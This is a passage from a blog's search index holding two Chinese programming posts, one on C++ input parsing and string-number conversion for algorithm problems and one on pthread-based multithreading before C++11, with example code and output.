<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2019-9-21-c++ 多线程（c++11标准以前）</title>
      <link href="/passages/2019-10-21-c++%E7%AE%97%E6%B3%95%E9%A2%98%E8%BE%93%E5%85%A5%E5%A4%84%E7%90%86%E5%B0%8F%E7%BB%93/"/>
      <url>/passages/2019-10-21-c++%E7%AE%97%E6%B3%95%E9%A2%98%E8%BE%93%E5%85%A5%E5%A4%84%E7%90%86%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="c-算法题输入处理小结"><a href="#c-算法题输入处理小结" class="headerlink" title="c++算法题输入处理小结"></a>c++算法题输入处理小结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于刚做算法题的人而言，第一步是先能处理好输入的数据，然后才是开始考虑用什么数据结构和算法去解决问题，前几天为了笔试刷算法题的时候才发现虽然两年前为了acm刷过一个多月的题目，但是现在连基本的字符串输入处理都要调试很久，因此在这里总结一下，以备未来使用。</p><p><a href="https://ac.nowcoder.com/acm/contest/320#question" target="_blank" rel="noopener">https://ac.nowcoder.com/acm/contest/320#question</a> OJ在线编程常见输入输出练习场</p><h2 id="字符串处理1：单行多个字符排序"><a href="#字符串处理1：单行多个字符排序" class="headerlink" title="字符串处理1：单行多个字符排序"></a>字符串处理1：单行多个字符排序</h2><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对输入的字符串进行排序后输出</span><br></pre></td></tr></table></figure><p>输入描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入有两行，第一行n</span><br><span class="line"></span><br><span class="line">第二行是n个空格隔开的字符串</span><br></pre></td></tr></table></figure><p>输出描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出一行排序后的字符串，空格隔开，无结尾空格</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">5</span><br><span class="line">c d a bb e</span><br><span class="line">输出：</span><br><span class="line">a bb c d e</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="built_in">string</span> a,<span class="built_in">string</span> b)</span></span>&#123;<span class="comment">//按从小到大排列</span></span><br><span class="line">    <span class="keyword">return</span> a&lt;b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">string</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a,a+n,cmp);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;a[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果给定了字符数量，用for循环就行，cin在遇到空格和回车符的时候会截断。如果没有给定数量，可以用while(cin&gt;&gt;a)，遇到输入的时候会自动终止。</p><h2 id="字符串处理2：多行多个字符串"><a href="#字符串处理2：多行多个字符串" class="headerlink" title="字符串处理2：多行多个字符串"></a>字符串处理2：多行多个字符串</h2><p>题目描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对输入的字符串进行排序后输出</span><br></pre></td></tr></table></figure><p>输入描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">多个测试用例，每个测试用例一行。</span><br><span class="line">每行通过空格隔开，有n个字符，n＜100</span><br></pre></td></tr></table></figure><p>输出描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于每组测试用例，输出一行排序过的字符串，每个字符串通过空格隔开</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">a c bb</span><br><span class="line">f dddd</span><br><span class="line">nowcoder</span><br><span class="line">输出：</span><br><span class="line">a bb c</span><br><span class="line">dddd f</span><br><span class="line">nowcoder</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">char</span>* a,<span class="keyword">char</span>* b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>(a)&lt;<span class="built_in">string</span>(b);<span class="comment">//char*转string可以直接string(char*)强制转换,根据题意是对字符串进行排序，char*只对字符串第一个字符排序，所以需要转换。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>* p[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>.getline(a,<span class="number">100</span>))&#123;</span><br><span class="line">        p[count]=strtok(a,<span class="string">" "</span>);<span class="comment">//strtok（char * 待分割字符数组，'要分割的字符，可以填入多个，只要遇到其中一个就进行分割'）</span></span><br><span class="line">        <span class="keyword">while</span>(p[count]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            p[count]=strtok(<span class="literal">NULL</span>,<span class="string">" "</span>);<span class="comment">//之后如果还要对原字符串进行分割，就要填入NULL，要对新的字符串进行分割就填入新的字符串。</span></span><br><span class="line">        &#125;</span><br><span class="line">        sort(p,p+count,cmp);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;p[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;count;j++)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;p[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">        count=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题第一个难点是每一行的数据是不定长的，所以不能简单地用while（cin&gt;&gt;a），如果不像被空格隔断，我知道的办法里只有cin.getline（char*,int）</p><p>C++并没有像python里split那样方便地对字符串进行分割的字符串，只有类似的能进行字符串分割的strtok，strtok只能对字符串数组进行一次分割，也就是分成两半，然后把前一半存到char * 中返回，剩下的一半还会存在strtok的缓存中（我是这么理解的，因为如果还想对原字符数组进行分割，strtok的第一个参数就要为NULL），所以只有第一次调用strtok才需要在第一个参数中填入待分割的char * ，之后都要填入NULL。</p><h2 id="字符和数字转换"><a href="#字符和数字转换" class="headerlink" title="字符和数字转换"></a>字符和数字转换</h2><p>以下转自<a href="https://blog.csdn.net/sinat_40872274/article/details/81367815" target="_blank" rel="noopener">https://blog.csdn.net/sinat_40872274/article/details/81367815</a></p><p>1.【字符串转换为数值】</p><p>string和数值转换    转换类型<br>to_string(val)    把val转换成string<br>stoi(s,p,b)    把字符串s从p开始转换成b进制的int<br>stol(s,p,b)    把字符串s从p开始转换成b进制的long<br>stoul(s,p,b)    把字符串s从p开始转换成b进制的unsigned long<br>stoll(s,p,b)    把字符串s从p开始转换成b进制的long long<br>stoull(s,p,b)    把字符串s从p开始转换成b进制的unsigned long long<br>stof(s,p)    把字符串s从p开始转换成float<br>stod(s,p)    把字符串s从p开始转换成double<br>stold(s,p)    l把字符串s从p开始转换成long double</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">string</span> s=<span class="string">"222.22"</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"s="</span>&lt;&lt;s&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">222</span>;</span><br><span class="line"><span class="keyword">int</span> ot = stoi(s,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> ol = stol(s,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">float</span> of = stof(s,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">double</span> od = stod(s,<span class="number">0</span>); </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"ot="</span>&lt;&lt;ot&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"ol="</span>&lt;&lt;ol&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"of="</span>&lt;&lt;of&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"od="</span>&lt;&lt;od&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=222.22</span><br><span class="line">ot=222</span><br><span class="line">ol=222</span><br><span class="line">of=222.22</span><br><span class="line">od=222.22</span><br></pre></td></tr></table></figure><p>2.【数值转换为字符串】</p><p>用stringstream即可把多种数值类型转换为String类型的字符串</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">123.32</span>;</span><br><span class="line">    <span class="built_in">string</span> res;</span><br><span class="line">    <span class="built_in">stringstream</span> ss;</span><br><span class="line">    ss &lt;&lt; a;</span><br><span class="line">    ss &gt;&gt; res;<span class="comment">//或者 res = ss.str();</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;res; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123.32</span><br></pre></td></tr></table></figure><p>3.【Char数组类型的字符串】</p><p>这里是使用C语言提供了几个标准库函数，可以将任意类型(整型、长整型、浮点型等)的数字和字符串相互转换。</p><p>字符串和数值转换    作用<br> atof(s)    将字符串s[n]转换为双精度浮点型值。<br> atoi(s)    将字符串s[n]转换为整型值。<br> atol(s)    将字符串s[n]转换为长整型值。<br>strtod(s, *p,b)    将字符串s[n]转换为b进制双精度浮点型值，到p停止,并报告不能被转换的所有剩余数字。<br>strtol(s, *p,b)    将字符串s[n]转换为b进制长整值，到p停止,并报告不能被转换的所有剩余数字。<br>strtoul(s, *p,b)    将字符串s[n]转换为b进制无符号长整型值，到p停止,并报告不能被转换的所有剩余数字。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span> )</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>]=<span class="string">"1431"</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The number integer is %d\n"</span>,atoi(s));</span><br><span class="line">    </span><br><span class="line"><span class="keyword">double</span> a=<span class="number">123.45</span>;</span><br><span class="line"><span class="keyword">double</span> b=<span class="number">-1234.56</span>;</span><br><span class="line"><span class="keyword">char</span> ptr[<span class="number">50</span>];</span><br><span class="line">gcvt(a,<span class="number">5</span>,ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a value=%s\n"</span>,ptr);</span><br><span class="line">gcvt(b,<span class="number">6</span>,ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b value=%s\n"</span>,ptr);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The number integer is 1431</span><br><span class="line">a value=123.45</span><br><span class="line">b value=-1234.56</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-9-21-c++ 多线程（c++11标准以前）</title>
      <link href="/passages/2019-10-21-c++%20%E5%A4%9A%E7%BA%BF%E7%A8%8B%EF%BC%88c++11%E6%A0%87%E5%87%86%E4%BB%A5%E5%89%8D%EF%BC%89/"/>
      <url>/passages/2019-10-21-c++%20%E5%A4%9A%E7%BA%BF%E7%A8%8B%EF%BC%88c++11%E6%A0%87%E5%87%86%E4%BB%A5%E5%89%8D%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="c-多线程（c-11标准以前）"><a href="#c-多线程（c-11标准以前）" class="headerlink" title="c++ 多线程（c++11标准以前）"></a>c++ 多线程（c++11标准以前）</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>C++标准并没有提供对多进程并发的原生支持，所以C++的多进程并发要靠其他API——这需要依赖相关平台。</p><p>Linux系统下的多线程遵循POSIX线程接口，称为pthread。编写Linux下的多线程程序，需要使用头文件pthread.h，连接时需要使用库libpthread.a。顺便说一下，Linux下pthread的实现是通过系统调用clone（）来实现的。clone（）是Linux所特有的系统调用，它的使用方式类似fork。</p><p>POSIX：</p><p><strong>可移植操作系统接口</strong>（英语：Portable Operating System Interface，缩写为<strong>POSIX</strong>）是<a href="https://baike.baidu.com/item/IEEE" target="_blank" rel="noopener">IEEE</a>为要在各种<a href="https://baike.baidu.com/item/UNIX" target="_blank" rel="noopener">UNIX</a><a href="https://baike.baidu.com/item/操作系统" target="_blank" rel="noopener">操作系统</a>上运行软件，而定义<a href="https://baike.baidu.com/item/API" target="_blank" rel="noopener">API</a>的一系列互相关联的标准的总称。</p><p>C++11 标准提供了一个新的线程库，内容包括了管理线程、保护共享数据、线程间的同步操作、低级原子操作等各种类。标准极大地提高了程序的可移植性，以前的多线程依赖于具体的平台，而现在有了统一的接口进行实现。</p><p>C++11 新标准中引入了几个头文件来支持多线程编程：</p><ul><li><strong>&lt; thread &gt;</strong> :包含std::thread类以及std::this_thread命名空间。</li><li><strong>&lt; atomic &gt;</strong> :包含std::atomic和std::atomic_flag类，以及一套C风格的原子类型和与C兼容的原子操作的函数。</li><li><strong>&lt; mutex &gt;</strong> :包含了与互斥量相关的类以及其他类型和函数。</li><li><strong>&lt; future &gt;</strong> :包含两个Provider类（std::promise和std::package_task）和两个Future类（std::future和std::shared_future）以及相关的类型和函数。</li><li><strong>&lt; condition_variable &gt;</strong> :包含与条件变量相关的类，包括std::condition_variable和std::condition_variable_any。</li></ul><h2 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line">pthread_create (thread, attr, start_routine, arg) ;</span><br></pre></td></tr></table></figure><p>pthread_create的四个参数</p><ul><li><p><strong>thread</strong>：指向线程标识符指针。</p></li><li><p><strong>attr</strong>：一个不透明的属性对象，可以被用来设置线程属性。您可以指定线程属性对象，也可以使用默认值 NULL。</p></li><li><p><strong>start_routine</strong>：线程运行函数起始地址，一旦线程被创建就会执行。</p></li><li><p><strong>arg</strong>：运行函数的参数。它必须通过把引用作为指针强制转换为 void 类型进行传递。如果没有传递参数，则使用 NULL。</p></li></ul><p>创建线程成功时，函数返回 0，若返回值不为 0 则说明创建线程失败。</p><h2 id="终止线程"><a href="#终止线程" class="headerlink" title="终止线程"></a>终止线程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line">pthread_exit (status)</span><br></pre></td></tr></table></figure><p>在这里，<strong>pthread_exit</strong> 用于显式地退出一个线程。通常情况下，pthread_exit() 函数是在线程完成工作后无需继续存在时被调用。线程在运行完成后会自动隐式地退出。</p><h2 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_THREADS     5</span></span><br><span class="line"><span class="comment">// 线程的运行函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">PrintHello</span><span class="params">(<span class="keyword">void</span> *threadid)</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   <span class="comment">// 对传入的参数进行强制类型转换，由无类型指针变为整形数指针，然后再读取</span></span><br><span class="line">   <span class="keyword">int</span> tid = *((<span class="keyword">int</span>*)threadid);</span><br><span class="line">   <span class="built_in">cout</span> &lt;&lt; <span class="string">"Hello Runoob! 线程 ID, "</span> &lt;&lt; tid &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">   pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// 定义线程的 id 变量，多个变量使用数组</span></span><br><span class="line">   <span class="keyword">pthread_t</span> threads[NUM_THREADS];</span><br><span class="line">   <span class="keyword">int</span> indexes[NUM_THREADS];<span class="comment">// 用数组来保存i的值</span></span><br><span class="line">   <span class="keyword">int</span> rc;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">for</span>( i=<span class="number">0</span>; i &lt; NUM_THREADS; i++ )&#123;      </span><br><span class="line">      <span class="built_in">cout</span> &lt;&lt; <span class="string">"main() : 创建线程, "</span> &lt;&lt; i &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">      indexes[i] = i; <span class="comment">//先保存i的值</span></span><br><span class="line">      <span class="comment">//参数依次是：创建的线程id，线程参数，调用的函数，传入的函数参数</span></span><br><span class="line">      <span class="comment">//线程函数参数传入的时候必须强制转换为void* 类型，即无类型指针        </span></span><br><span class="line">      rc = pthread_create(&amp;threads[i], <span class="literal">NULL</span>, </span><br><span class="line">                          PrintHello, (<span class="keyword">void</span> *)&amp;(indexes[i]));</span><br><span class="line">      <span class="keyword">if</span> (rc)&#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">"Error:无法创建线程,"</span> &lt;&lt; rc &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//等各个线程退出后，进程才结束，否则进程强制结束了，线程可能还没反应过来；</span></span><br><span class="line">   pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并运行后预期产生如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ g++ test.cpp -lpthread -o test.o</span><br><span class="line">$ ./test.o</span><br><span class="line">main() : 创建线程, 0</span><br><span class="line">main() : 创建线程, 1</span><br><span class="line">Hello Runoob! 线程 ID, 0</span><br><span class="line">main() : 创建线程, Hello Runoob! 线程 ID, 21</span><br><span class="line"></span><br><span class="line">main() : 创建线程, 3</span><br><span class="line">Hello Runoob! 线程 ID, 2</span><br><span class="line">main() : 创建线程, 4</span><br><span class="line">Hello Runoob! 线程 ID, 3</span><br><span class="line">Hello Runoob! 线程 ID, 4</span><br></pre></td></tr></table></figure><p>实际在Ubuntu16中测试结果却是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">main() : 创建线程, 0</span><br><span class="line">main() : 创建线程, 1</span><br><span class="line">main() : 创建线程, 2</span><br><span class="line">main() : 创建线程, 3</span><br><span class="line">main() : 创建线程, 4</span><br><span class="line">Hello Runoob! 线程 ID, 4</span><br><span class="line">Hello Runoob! 线程 ID, 3</span><br><span class="line">Hello Runoob! 线程 ID, 2</span><br><span class="line">Hello Runoob! 线程 ID, 1</span><br><span class="line">Hello Runoob! 线程 ID, 0</span><br></pre></td></tr></table></figure><p>非常规律，目前原因未知。</p><h2 id="例子2（包含pthread-join的使用）"><a href="#例子2（包含pthread-join的使用）" class="headerlink" title="例子2（包含pthread_join的使用）"></a>例子2（包含pthread_join的使用）</h2><p>pthread_join（）函数原型：</p><p>int pthread_join(pthread_t thread, void **retval);</p><p>两个参数:</p><ul><li>thread: 线程标识符，即线程ID，标识唯一线程。</li><li>retval: 用户定义的指针，用来存储被等待线程的返回值。</li></ul><p>返回值:    线程连接的状态，0是成功，非0是失败</p><p>linux线程执行和windows不同，pthread有两种状态joinable状态和unjoinable状态，如果线程是joinable状态，当线程函数自己返回退出时或pthread_exit时都不会释放线程所占用堆栈和线程描述符（总计8K多）。只有当你调用了pthread_join之后这些资源才会被释放。若是unjoinable状态的线程，这些资源在线程函数退出时或pthread_exit时自动会被释放。</p><p>unjoinable属性可以在pthread_create时指定，或在线程创建后在线程中pthread_detach自己, 如：pthread_detach(pthread_self())，将状态改为unjoinable状态，确保资源的释放。或者将线程置为 joinable,然后适时调用pthread_join。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 